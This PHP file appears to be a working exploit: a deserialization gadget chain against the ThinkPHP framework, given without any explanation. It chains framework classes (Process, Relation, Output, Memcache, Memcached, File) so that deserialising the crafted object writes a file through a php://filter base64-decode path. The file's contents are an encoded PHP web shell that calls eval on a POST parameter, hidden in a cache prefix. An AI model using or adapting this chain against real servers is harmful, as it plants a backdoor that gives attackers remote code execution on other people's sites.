<?php
namespace think;


class Process
{
    private $processPipes;

    private $status;

    private $processInformation;
    public function  __construct(){
        $this->processInformation['running']=true;
        $this->status=3;
        $this->processPipes=new \think\model\Relation();
    }

}
namespace think\model;

use think\console\Output;

class Relation
{
    protected $query;
    const HAS_ONE          = 1;
    const HAS_MANY         = 2;
    const HAS_MANY_THROUGH = 5;
    const BELONGS_TO       = 3;
    const BELONGS_TO_MANY  = 4;
    protected $type=2;
    protected $where=1;
    public function __construct()
    {
        $this->query=new Output();
    }
}


namespace think\console;
class Output{
    protected $styles = [
        'info',
        'error',
        'comment',
        'question',
        'highlight',
        'warning',
        'getTable',
        'where'
    ];
    private $handle;
    public function __construct()
    {
        $this->handle = (new \think\session\driver\Memcache);
    }
}
namespace think\session\driver;
class Memcache
{
    protected $handler;
    public function __construct()
    {
        $this->handler = (new \think\cache\driver\Memcached);
    }
}


namespace think\cache\driver;

class Memcached
{
    protected $tag;
    protected $options;
    protected $handler;

    public function __construct()
    {
        $this->tag = true;
        $this->options = [
            'expire'   => 0,
            'prefix'   => 'PD9waHAgZXZhbCgkX1BPU1RbJ3pjeTIwMTgnXSk7ID8+',
        ];
        $this->handler = (new File);
    }
}

class File
{
    protected $tag;
    protected $options;
    public function __construct()
    {
        $this->tag = false;
        $this->options = [
            'expire'        => 3600,
            'cache_subdir'  => false,
            'prefix'        => '',
            'data_compress' => false,
            'path'          => 'php://filter/convert.base64-decode/resource=./',
        ];
    }
}